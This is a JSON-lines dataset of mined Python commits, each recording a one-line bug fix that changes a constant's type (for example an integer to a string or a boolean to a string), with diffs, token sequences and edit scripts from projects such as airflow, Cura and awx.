{"project": "scipion-em-chimera", "commit_sha": "17328656d6d0a152da06f840159fa2bd65d0a685", "parent_sha": "0987fb2711456ef7e61a810df940f8eebf0ecef8", "file_path": "chimera/protocols/protocol_base.py", "project_url": "https://github.com/scipion-em/scipion-em-chimera", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -279,7 +279,7 @@ class ChimeraProtBase(EMProtocol):\n         # so scipionwrite is disabled\n         config = configparser.ConfigParser()\n         config.read(self._getExtraPath(chimeraConfigFileName))\n-        config.set('chimerax', 'enablebundle', False)\n+        config.set('chimerax', 'enablebundle', 'False')\n         with open(self._getExtraPath(chimeraConfigFileName),\n                   'w') as configfile:\n             config.write(configfile)\n", "before": "config . set ( 'chimerax' , 'enablebundle' , False )", "after": "config . set ( 'chimerax' , 'enablebundle' , 'False' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 19, 3, 54], [\"string:'False'\", \"T\"], 5], [\"Delete\", [\"false:False\", 3, 48, 3, 53]]]"}
{"project": "circus", "commit_sha": "6b4f70043668c14e104fa9323fb9ecdf559528ad", "parent_sha": "15ca9a3c4fb537f398fbfe43c7c974766ed0e37c", "file_path": "circus/tests/test_config.py", "project_url": "https://github.com/seatgeek/circus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -96,4 +96,4 @@ class TestConfig(unittest.TestCase):\n     def test_issue395(self):\n         conf = get_config(_CONF['issue395'])\n         watcher = conf['watchers'][0]\n-        self.assertEqual(watcher['graceful_timeout'], '88')\n+        self.assertEqual(watcher['graceful_timeout'], 88)\n", "before": "self . assertEqual ( watcher [ 'graceful_timeout' ] , '88' )", "after": "self . assertEqual ( watcher [ 'graceful_timeout' ] , 88 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 60], [\"integer:88\", \"T\"], 3], [\"Delete\", [\"string:'88'\", 3, 55, 3, 59]]]"}
{"project": "flask-restful", "commit_sha": "9ee101ce7cfab5fc254385aa22b123a528d2d53d", "parent_sha": "38cfd6bc9b8fbcbbb3266d3f97d79c356d1e115f", "file_path": "tests/test_reqparse.py", "project_url": "https://github.com/ok7-eleven/flask-restful", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -548,7 +548,7 @@ class ReqParseTestCase(unittest.TestCase):\n         parser.add_argument(\"foo\", type=decimal.Decimal, location=\"json\")\n \n         with app.test_request_context('/bubble', method='post',\n-                                      data=json.dumps({\"foo\": 1.0025}),\n+                                      data=json.dumps({\"foo\": \"1.0025\"}),\n                                       content_type='application/json'):\n             args = parser.parse_args()\n             self.assertEquals(args['foo'], decimal.Decimal(\"1.0025\"))\n", "before": "with app . test_request_context ( '/bubble' , method = 'post' , data = json . dumps ( { \"foo\" : 1.0025 } ) , content_type = 'application/json' ) : args = parser . parse_args ( ) self . assertEquals ( args [ 'foo' ] , decimal . Decimal ( \"1.0025\" ) )", "after": "with app . test_request_context ( '/bubble' , method = 'post' , data = json . dumps ( { \"foo\" : \"1.0025\" } ) , content_type = 'application/json' ) : args = parser . parse_args ( ) self . assertEquals ( args [ 'foo' ] , decimal . Decimal ( \"1.0025\" ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"pair\", 3, 56, 3, 69], [\"string:\\\"1.0025\\\"\", \"T\"], 2], [\"Delete\", [\"float:1.0025\", 3, 63, 3, 69]]]"}
{"project": "oe-core", "commit_sha": "1849ce3bd7c0af055f3e849a6508e746b6a0dca5", "parent_sha": "1e0cf88f6aecb0b523f7ef016fcd95d25a10e066", "file_path": "meta/lib/oe/package_manager.py", "project_url": "https://github.com/OSSystems/oe-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -585,7 +585,7 @@ class RpmPM(PackageManager):\n \n         output = self._invoke_dnf(([\"--skip-broken\"] if attempt_only else []) +\n                          ([\"-x\", \",\".join(exclude_pkgs)] if len(exclude_pkgs) > 0 else []) +\n-                         ([\"--setopt=install_weak_deps=False\"] if self.d.getVar('NO_RECOMMENDATIONS') == 1 else []) +\n+                         ([\"--setopt=install_weak_deps=False\"] if self.d.getVar('NO_RECOMMENDATIONS') == \"1\" else []) +\n                          ([\"--nogpgcheck\"] if self.d.getVar('RPM_SIGN_PACKAGES') != '1' else [\"--setopt=gpgcheck=True\"]) +\n                          [\"install\"] +\n                          pkgs)\n", "before": "output = self . _invoke_dnf ( ( [ \"--skip-broken\" ] if attempt_only else [ ] ) + ( [ \"-x\" , \",\" . join ( exclude_pkgs ) ] if len ( exclude_pkgs ) > 0 else [ ] ) + ( [ \"--setopt=install_weak_deps=False\" ] if self . d . getVar ( 'NO_RECOMMENDATIONS' ) == 1 else [ ] ) + ( [ \"--nogpgcheck\" ] if self . d . getVar ( 'RPM_SIGN_PACKAGES' ) != '1' else [ \"--setopt=gpgcheck=True\" ] ) + [ \"install\" ] + pkgs )", "after": "output = self . _invoke_dnf ( ( [ \"--skip-broken\" ] if attempt_only else [ ] ) + ( [ \"-x\" , \",\" . join ( exclude_pkgs ) ] if len ( exclude_pkgs ) > 0 else [ ] ) + ( [ \"--setopt=install_weak_deps=False\" ] if self . d . getVar ( 'NO_RECOMMENDATIONS' ) == \"1\" else [ ] ) + ( [ \"--nogpgcheck\" ] if self . d . getVar ( 'RPM_SIGN_PACKAGES' ) != '1' else [ \"--setopt=gpgcheck=True\" ] ) + [ \"install\" ] + pkgs )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 67, 3, 107], [\"string:\\\"1\\\"\", \"T\"], 2], [\"Delete\", [\"integer:1\", 3, 106, 3, 107]]]"}
{"project": "airflow", "commit_sha": "e2f138e180376e721326dfcd22f21da720200913", "parent_sha": "17eb94f723502d8bbc716763a7513db0a8afa52d", "file_path": "airflow/utils/db.py", "project_url": "https://github.com/drewsonne/airflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -95,7 +95,7 @@ def initdb():\n             schema='airflow'))\n     merge_conn(\n         Connection(\n-            conn_id='beeline_default', conn_type='beeline', port=\"10000\",\n+            conn_id='beeline_default', conn_type='beeline', port=10000,\n             host='localhost', extra=\"{\\\"use_beeline\\\": true, \\\"auth\\\": \\\"\\\"}\",\n             schema='default'))\n     merge_conn(\n", "before": "schema = 'airflow' ) ) merge_conn ( Connection ( conn_id = 'beeline_default' , conn_type = 'beeline' , port = \"10000\" , host = 'localhost' , extra = \"{\\\"use_beeline\\\": true, \\\"auth\\\": \\\"\\\"}\" , schema = 'default' ) )", "after": "schema = 'airflow' ) ) merge_conn ( Connection ( conn_id = 'beeline_default' , conn_type = 'beeline' , port = 10000 , host = 'localhost' , extra = \"{\\\"use_beeline\\\": true, \\\"auth\\\": \\\"\\\"}\" , schema = 'default' ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 61, 3, 73], [\"integer:10000\", \"T\"], 2], [\"Delete\", [\"string:\\\"10000\\\"\", 3, 66, 3, 73]]]"}
{"project": "Cura", "commit_sha": "957009a768d8fa8808dbf14ec06e8abfca04e120", "parent_sha": "8f41185f228eaf153bcc37bb6bf1eb1018a7d0e5", "file_path": "cura/Settings/MachineManager.py", "project_url": "https://github.com/FABtotum/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -944,7 +944,7 @@ class MachineManager(QObject):\n             })\n \n         # also find a global quality for the machine\n-        global_quality = quality_manager.findQualityByQualityType(quality_type, global_machine_definition, [], global_quality = True)\n+        global_quality = quality_manager.findQualityByQualityType(quality_type, global_machine_definition, [], global_quality = \"True\")\n \n         # if there is not global quality but we're using a single extrusion machine, copy the quality of the first extruder - CURA-4482\n         if not global_quality and len(extruder_stacks) == 1:\n", "before": "global_quality = quality_manager . findQualityByQualityType ( quality_type , global_machine_definition , [ ] , global_quality = True )", "after": "global_quality = quality_manager . findQualityByQualityType ( quality_type , global_machine_definition , [ ] , global_quality = \"True\" )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 112, 3, 133], [\"string:\\\"True\\\"\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 129, 3, 133]]]"}
{"project": "onepercentclub-site", "commit_sha": "a7861110935ed8d68e85f41f8cc0ec1ef826b9b7", "parent_sha": "b12074bc8fa9329bc6de041fe119b95e4c1cd6f0", "file_path": "apps/fundraisers/models.py", "project_url": "https://github.com/maykinmedia/onepercentclub-site", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class FundRaiser(models.Model):\n         if donations:\n             total = donations.aggregate(sum=Sum('amount'))\n             return total['sum']\n-        return 0.0\n+        return '000'\n \n     def get_meta_title(self, **kwargs):\n         title = _(u\"{fundraiser} for {project}\").format(\n", "before": "return 0.0", "after": "return '000'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 19], [\"string:'000'\", \"T\"], 1], [\"Delete\", [\"float:0.0\", 3, 16, 3, 19]]]"}
{"project": "caffe-tensorflow", "commit_sha": "c6cb609e9ecbff69fc2b281b7ff3f053dbebc9b6", "parent_sha": "a76f5e75c24a7b2d7442fe6bdf42718912102096", "file_path": "kaffe/shapes.py", "project_url": "https://github.com/raingo/caffe-tensorflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ def get_filter_output_shape(i_h, i_w, params, round_func):\n     #    / stride_data[i] + 1;\n \n     def _get_dim(input_dim, dil, ks, pad, stride):\n-        kernel_extent = dil*(ks-1)+1\n+        kernel_extent = dil*(ks-1)+1.\n         return (input_dim+2*pad-kernel_extent)/stride+1\n     o_h = _get_dim(i_h, params.dilation, params.kernel_h, params.pad_h, params.stride_h)\n     o_w = _get_dim(i_w, params.dilation, params.kernel_w, params.pad_w, params.stride_w)\n", "before": "kernel_extent = dil * ( ks - 1 ) + 1", "after": "kernel_extent = dil * ( ks - 1 ) + 1.", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 25, 3, 37], [\"float:1.\", \"T\"], 2], [\"Delete\", [\"integer:1\", 3, 36, 3, 37]]]"}
{"project": "Projet_M2", "commit_sha": "529b606680c556d7e1ba25e59c0fd653d8a5be4b", "parent_sha": "f1fc92abfcfc524e10870a43ab3c9fbed459b4f5", "file_path": "prediction_folder/model_quality_tools.py", "project_url": "https://github.com/Zangdarr/Projet_M2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ def computeQualityEvaluation():\n     towriteSTAR = []\n \n     for g in range(nb_of_generations):\n-        nb_off_predict_star = 0\n+        nb_off_predict_star = 0.0\n         sum_mse_star = 0.0\n         sum_mae_star = 0.0\n         sum_tcheby_pred_star = 0.0\n", "before": "nb_off_predict_star = 0", "after": "nb_off_predict_star = 0.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 32], [\"float:0.0\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 31, 3, 32]]]"}
{"project": "astrolibpy", "commit_sha": "3582ab70463c6747c5a434f18b4c18fb31ccf308", "parent_sha": "b200523a4db29deb4f245cdda1ccb014b53f49f3", "file_path": "my_utils/match_lists.py", "project_url": "https://github.com/abeelen/astrolibpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,7 +35,7 @@ def match_lists(ra1, dec1, ra2, dec2, dist, numNei=1):\n \tcosd = lambda x : cos(deg2rad(x))\n \tsind = lambda x : sin(deg2rad(x))\n-\tmindist = 2 * sind(dist/2)\t\n+\tmindist = 2 * sind(dist/2.)\t\n \tgetxyz = lambda r, d: [cosd(r)*cosd(d), sind(r)*cosd(d), sind(d)]\n \txyz1 = numpy.array(getxyz(ra1, dec1))\n \txyz2 = numpy.array(getxyz(ra2, dec2))\n", "before": "mindist = 2 * sind ( dist / 2 )", "after": "mindist = 2 * sind ( dist / 2. )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 2, 21, 2, 27], [\"float:2.\", \"T\"], 2], [\"Delete\", [\"integer:2\", 2, 26, 2, 27]]]"}
{"project": "python-github3", "commit_sha": "ccbfd48f42103de18eb60e99340de3a27e49447f", "parent_sha": "3371f0aabc61dfc8549f0752ccc83aef06df61e8", "file_path": "pygithub3/services/base.py", "project_url": "https://github.com/Kagami/python-github3", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,7 +62,7 @@ class Base(object):\n         input_data = request.get_body() or ''\n         response = self._client.put(request, data=input_data, **kwargs)\n-        if response.status_code != '204':  # != NO_CONTENT\n+        if response.status_code != 204:  # != NO_CONTENT\n             return request.resource.loads(response.content)\n \n     def _delete(self, request, **kwargs):\n", "before": "if response . status_code != '204' : return request . resource . loads ( response . content )", "after": "if response . status_code != 204 : return request . resource . loads ( response . content )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 2, 12, 2, 41], [\"integer:204\", \"T\"], 2], [\"Delete\", [\"string:'204'\", 2, 36, 2, 41]]]"}
{"project": "kaggle", "commit_sha": "fa82ad9ac0e07e43bb0d513b79b7670dd1e1fae6", "parent_sha": "4d4e8d4ce81e7d7d64b3c5c347966c98cd452e8d", "file_path": "lib/learning.py", "project_url": "https://github.com/challenging/kaggle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ class LearningFactory(object):\n             else:\n                 log(\"4. Can't create model based on {}\".format(method), ERROR)\n         elif method.find(\"deep\") > -1:\n-            setting[\"folder\"] = \"{}/nn_layer={}_neurno={}_nfold={}_class_weight={}\".format(setting[\"folder\"], setting[\"number_of_layer\"], setting[\"dimension\"], setting[\"nfold\"]. setting[\"class_weight\"][0])\n+            setting[\"folder\"] = \"{}/nn_layer={}_neurno={}_nfold={}_class_weight={}\".format(setting[\"folder\"], setting[\"number_of_layer\"], setting[\"dimension\"], setting[\"nfold\"]. setting[\"class_weight\"][\"0\"])\n             if not os.path.isdir(setting[\"folder\"]):\n                 try:\n                     os.makedirs(setting[\"folder\"])\n", "before": "\"{}/nn_layer={}_neurno={}_nfold={}_class_weight={}\" . format ( setting [ \"folder\" ] , setting [ \"number_of_layer\" ] , setting [ \"dimension\" ] , setting [ \"nfold\" ] . setting [ \"class_weight\" ] [ 0 ] )", "after": "\"{}/nn_layer={}_neurno={}_nfold={}_class_weight={}\" . format ( setting [ \"folder\" ] , setting [ \"number_of_layer\" ] , setting [ \"dimension\" ] , setting [ \"nfold\" ] . setting [ \"class_weight\" ] [ \"0\" ] )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"subscript\", 3, 161, 3, 205], [\"string:\\\"0\\\"\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 203, 3, 204]]]"}
{"project": "kaggle", "commit_sha": "5129a267869d8c55fcebc5a24b05d1a6f169f40c", "parent_sha": "5b594d481a4b4d72a667b54acadb6f4545d1a5b7", "file_path": "lib/learning.py", "project_url": "https://github.com/challenging/kaggle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -103,7 +103,7 @@ class LearningFactory(object):\n             else:\n                 log(\"4. Can't create model based on {}\".format(method), ERROR)\n         elif method.find(\"deep\") > -1:\n-            setting[\"folder\"] = \"{}/nn_layer={}_neurno={}_nfold={}_class_weight={}\".format(setting[\"folder\"], setting[\"number_of_layer\"], setting[\"dimension\"], setting[\"nfold\"], setting[\"class_weight\"][\"0\"])\n+            setting[\"folder\"] = \"{}/nn_layer={}_neurno={}_nfold={}_class_weight={}\".format(setting[\"folder\"], setting[\"number_of_layer\"], setting[\"dimension\"], setting[\"nfold\"], setting[\"class_weight\"][0])\n             if not os.path.isdir(setting[\"folder\"]):\n                 try:\n                     os.makedirs(setting[\"folder\"])\n", "before": "\"{}/nn_layer={}_neurno={}_nfold={}_class_weight={}\" . format ( setting [ \"folder\" ] , setting [ \"number_of_layer\" ] , setting [ \"dimension\" ] , setting [ \"nfold\" ] , setting [ \"class_weight\" ] [ \"0\" ] )", "after": "\"{}/nn_layer={}_neurno={}_nfold={}_class_weight={}\" . format ( setting [ \"folder\" ] , setting [ \"number_of_layer\" ] , setting [ \"dimension\" ] , setting [ \"nfold\" ] , setting [ \"class_weight\" ] [ 0 ] )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"subscript\", 3, 179, 3, 207], [\"integer:0\", \"T\"], 2], [\"Delete\", [\"string:\\\"0\\\"\", 3, 203, 3, 206]]]"}
{"project": "monasca-docker", "commit_sha": "b40e42905bc4a89187717615e4489ee50703bb77", "parent_sha": "8e9f00e65f274e83652287105c6321e90b31be98", "file_path": "ci.py", "project_url": "https://github.com/monasca/monasca-docker", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -268,7 +268,7 @@ def get_current_init_status(docker_id):\n     status_output = output.rstrip()\n     print(status_output)\n     exit_code, status = status_output.split(\":\", 1)\n-    if exit_code == 0 and status == \"exited\":\n+    if exit_code == \"0\" and status == \"exited\":\n         return True\n     return False\n \n", "before": "if exit_code == 0 and status == \"exited\" : return True", "after": "if exit_code == \"0\" and status == \"exited\" : return True", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 22], [\"string:\\\"0\\\"\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 21, 3, 22]]]"}
{"project": "awx", "commit_sha": "259083c0e2149148d363bfa5e5a26ffb1bfaaf64", "parent_sha": "dfb864981aba1f3457e05a3ff37e3250be6bcc12", "file_path": "awx/main/tasks.py", "project_url": "https://github.com/peterdemin/awx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,7 +93,7 @@ class RunJob(Task):\n         # do not want AWX to ask interactive questions and want it to be friendly with reprovisioning\n         env['ANSIBLE_HOST_KEY_CHECKING'] = 'False'\n         # RHEL has too old of an SSH so ansible will select paramiko and this is VERY slow\n-        env['ANSIBLE_PARAMIKO_RECORD_HOST_KEYS'] = False\n+        env['ANSIBLE_PARAMIKO_RECORD_HOST_KEYS'] = 'False'\n         return env\n \n     def build_args(self, job, **kwargs):\n", "before": "env [ 'ANSIBLE_PARAMIKO_RECORD_HOST_KEYS' ] = False", "after": "env [ 'ANSIBLE_PARAMIKO_RECORD_HOST_KEYS' ] = 'False'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 57], [\"string:'False'\", \"T\"], 2], [\"Delete\", [\"false:False\", 3, 52, 3, 57]]]"}
{"project": "dumbfuzz-c", "commit_sha": "864975671a1d1d75f6145efa0028d9e004098ef0", "parent_sha": "d7655d764f23ca95c92b297f30640e4c985179bb", "file_path": "dumbfuzz-c.py", "project_url": "https://github.com/m0t/dumbfuzz-c", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -113,7 +113,7 @@ def parse_args():\n     parser.add_option(\"-S\", \"--skipto\", help=\"skip to #n iteration\", dest=\"skipto\", default=None)\n     parser.add_option(\"-L\", \"--list\", help=\"read filelist from file\", dest=\"filelist\", default=None)\n     parser.add_option(\"-D\", \"--fuzzdir\", help=\"create filelist from dir\", dest=\"fuzzdir\", default=None)\n-    parser.add_option(\"-N\", \"--noiterate\", help=\"dont iterate generated fuzzed case, pass whole folder\", action=\"store_true\", dest=\"noiterate\", default=\"False\")\n+    parser.add_option(\"-N\", \"--noiterate\", help=\"dont iterate generated fuzzed case, pass whole folder\", action=\"store_true\", dest=\"noiterate\", default=False)\n     parser.add_option(\"-C\", \"--cleanup\", help=\"run some script for cleanup after fuzz iteration\", dest=\"cleanup\", default=None)\n     \n     return parser.parse_args()\n", "before": "parser . add_option ( \"-N\" , \"--noiterate\" , help = \"dont iterate generated fuzzed case, pass whole folder\" , action = \"store_true\" , dest = \"noiterate\" , default = \"False\" )", "after": "parser . add_option ( \"-N\" , \"--noiterate\" , help = \"dont iterate generated fuzzed case, pass whole folder\" , action = \"store_true\" , dest = \"noiterate\" , default = False )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 145, 3, 160], [\"false:False\", \"T\"], 2], [\"Delete\", [\"string:\\\"False\\\"\", 3, 153, 3, 160]]]"}
{"project": "django-mangopay", "commit_sha": "8ab1d755a14e78482b326d586ed9f536b3800d6f", "parent_sha": "84bcbe6c9386694180e586a775f8796f282eae3f", "file_path": "mangopay/models.py", "project_url": "https://github.com/FundedByMe/django-mangopay", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -468,7 +468,7 @@ class MangoPayWallet(models.Model):\n \n     def balance(self):\n         wallet = self._get()\n-        return PythonMoney(wallet.Balance.Amount / 100,\n+        return PythonMoney(wallet.Balance.Amount / 100.0,\n                            wallet.Balance.Currency)\n \n     def _get(self):\n", "before": "return PythonMoney ( wallet . Balance . Amount / 100 , wallet . Balance . Currency )", "after": "return PythonMoney ( wallet . Balance . Amount / 100.0 , wallet . Balance . Currency )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 28, 3, 55], [\"float:100.0\", \"T\"], 2], [\"Delete\", [\"integer:100\", 3, 52, 3, 55]]]"}
{"project": "lemur", "commit_sha": "da9c91afb4f5b6bc6cb4016d5e3e049e4db41f13", "parent_sha": "bbc3bf513d17f3ecddfc29de0ce1f4ef20267a1d", "file_path": "lemur/common/celery.py", "project_url": "https://github.com/pmelse/lemur", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -348,7 +348,7 @@ def sync_source(source):\n         return\n     try:\n         sync([source])\n-        metrics.send(f\"{function}.success\", 'counter', '1', metric_tags={\"source\": source})\n+        metrics.send(f\"{function}.success\", 'counter', 1, metric_tags={\"source\": source})\n     except SoftTimeLimitExceeded:\n         log_data[\"message\"] = \"Error syncing source: Time limit exceeded.\"\n         current_app.logger.error(log_data)\n", "before": "metrics . send ( f\"{function}.success\" , 'counter' , '1' , metric_tags = { \"source\" : source } )", "after": "metrics . send ( f\"{function}.success\" , 'counter' , 1 , metric_tags = { \"source\" : source } )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 21, 3, 92], [\"integer:1\", \"T\"], 5], [\"Delete\", [\"string:'1'\", 3, 56, 3, 59]]]"}
{"project": "Tax-Calculator", "commit_sha": "02fabf86d93fc16c2a4500890fd40c7f76e809e3", "parent_sha": "8daed478d62eb4f3bf71737c128f02d379ab1593", "file_path": "taxcalc/records.py", "project_url": "https://github.com/MaxGhenis/Tax-Calculator", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -579,7 +579,7 @@ class Records(object):\n         # merge benefits with DataFrame of RECID\n         full_df = recid_df.merge(BEN_partial, on='RECID', how='left')\n         # fill missing values\n-        full_df.fillna(0.0, inplace=True)\n+        full_df.fillna(0, inplace=True)\n         assert len(recid_df) == len(full_df)\n         self.BEN = pd.DataFrame()\n         setattr(self, 'BEN', full_df.astype(np.float32))\n", "before": "full_df . fillna ( 0.0 , inplace = True )", "after": "full_df . fillna ( 0 , inplace = True )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 23, 3, 42], [\"integer:0\", \"T\"], 1], [\"Delete\", [\"float:0.0\", 3, 24, 3, 27]]]"}
{"project": "nimtrade-bot", "commit_sha": "f3fe03db3957d83a73b03dcb95075df12a52778b", "parent_sha": "55bc46b0a5e82461cd69abf19c75bedf67edf106", "file_path": "goldenbot.py", "project_url": "https://github.com/trishmapow/nimtrade-bot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -368,7 +368,7 @@ def main():\n             except ValueError:\n                 # The amount isn't a numeric value\n                 if len(msg) >= 2:\n-                    msg = [1] + msg\n+                    msg = [\"1\"] + msg\n                     # Show a custom message if currency1 == currency2\n                     if msg[1] == msg[2]:\n                         await client.send_message(message.channel, \"```js\\n{0} {1} = {0} {1}```\".format(msg[1], msg[0]))\n", "before": "ValueError : if len ( msg ) >= 2 : msg = [ 1 ] + msg", "after": "ValueError : if len ( msg ) >= 2 : msg = [ \"1\" ] + msg", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"list\", 3, 27, 3, 30], [\"string:\\\"1\\\"\", \"T\"], 1], [\"Delete\", [\"integer:1\", 3, 28, 3, 29]]]"}
{"project": "sdcflows", "commit_sha": "e13a24f8477d6dd2467294cc9c172e96f57b9e45", "parent_sha": "c96c151165e5edfaa75745da278c23c7f1b77684", "file_path": "fmriprep/workflows/confounds.py", "project_url": "https://github.com/oesteban/sdcflows", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -308,7 +308,7 @@ def get_ica_confounds(ica_out_dir, ignore_aroma_err):\n     if motion_ic_indices.size == 0:\n         if ignore_aroma_err:\n             LOGGER.warn('WARNING: No noise components were classified')\n-            no_noise_arr = np.ones((melodic_mix_arr.shape['0'], 1))\n+            no_noise_arr = np.ones((melodic_mix_arr.shape[0], 1))\n             aggr_tsv = aroma_add_header_func(no_noise_arr, 'no_noise_aggr_', ['00'])\n             nonaggr_tsv = aroma_add_header_func(no_noise_arr, 'no_noise_nonaggr_', ['00'])\n             aroma_confounds = (aggr_tsv, nonaggr_tsv)\n", "before": "no_noise_arr = np . ones ( ( melodic_mix_arr . shape [ '0' ] , 1 ) )", "after": "no_noise_arr = np . ones ( ( melodic_mix_arr . shape [ 0 ] , 1 ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"subscript\", 3, 37, 3, 63], [\"integer:0\", \"T\"], 2], [\"Delete\", [\"string:'0'\", 3, 59, 3, 62]]]"}
{"project": "optuna", "commit_sha": "e1137a756caeddc835ec150ab6c2848cc3c82a1a", "parent_sha": "860298c62df1044d470e159395ab9d56d4a765d0", "file_path": "tests/test_study.py", "project_url": "https://github.com/cafeal/optuna", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -30,7 +30,7 @@ class Func(object):\n         self.n_calls = 0\n         self.sleep_sec = sleep_sec\n         self.lock = threading.Lock()\n-        self.x_max = 10\n+        self.x_max = 10.0\n \n     def __call__(self, client):\n         # type: (client_module.BaseClient) -> float\n", "before": "self . x_max = 10", "after": "self . x_max = 10.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 24], [\"float:10.0\", \"T\"], 2], [\"Delete\", [\"integer:10\", 3, 22, 3, 24]]]"}
{"project": "voice-flight-following", "commit_sha": "1279087d747c63736e4f266d80be3430deb904c9", "parent_sha": "dbcb62ace9af5b1dfb217926fe37fb7da6612531", "file_path": "flightFollowing.py", "project_url": "https://github.com/jfayre/voice-flight-following", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -160,7 +160,7 @@ class FlightFollowing(object):\n \t\tif len(data['geonames']) >= 1:\n \t\t\tbearing = calcBearing (self.lat, self.lon, float(data[\"geonames\"][0][\"lat\"]), float(data[\"geonames\"][0][\"lng\"]))\n \t\t\tbearing = (degrees(bearing) +360) % 360\n-\t\t\tif self.distance_units == 1:\n+\t\t\tif self.distance_units == '1':\n \t\t\t\tdistance = float(data[\"geonames\"][0][\"distance\"]) / 1.609\n \t\t\t\tunits = 'miles'\n \t\t\telse:\n", "before": "if self . distance_units == 1 : distance = float ( data [ \"geonames\" ] [ 0 ] [ \"distance\" ] ) / 1.609 units = 'miles' else : ", "after": "if self . distance_units == '1' : distance = float ( data [ \"geonames\" ] [ 0 ] [ \"distance\" ] ) / 1.609 units = 'miles' else : ", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 7, 3, 31], [\"string:'1'\", \"T\"], 2], [\"Delete\", [\"integer:1\", 3, 30, 3, 31]]]"}
{"project": "satchmo", "commit_sha": "5de2c57967db36f7c52341a3bd70b73a64f3d904", "parent_sha": "c4c5013b5f28dc0857a5804d3b61426ada038e53", "file_path": "satchmo/payment/tests.py", "project_url": "https://github.com/ramanan12345/satchmo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class TestRecurringBilling(TestCase):\n         self.assertEqual(self.response.status_code, 200)\n         self.assertEqual(self.response.content, '')\n         self.assert_(order_count < OrderItem.objects.count())\n-        self.assertEqual(order_count, OrderItem.objects.count()/2)\n+        self.assertEqual(order_count, OrderItem.objects.count()/2.0)\n         for order in OrderItem.objects.filter(expire_date__gt=datetime.datetime.now()):\n             price, expire_days = self.getTerms(order.product, ignore_trial=True)\n             if price is None:\n", "before": "self . assertEqual ( order_count , OrderItem . objects . count ( ) / 2 )", "after": "self . assertEqual ( order_count , OrderItem . objects . count ( ) / 2.0 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 39, 3, 66], [\"float:2.0\", \"T\"], 2], [\"Delete\", [\"integer:2\", 3, 65, 3, 66]]]"}
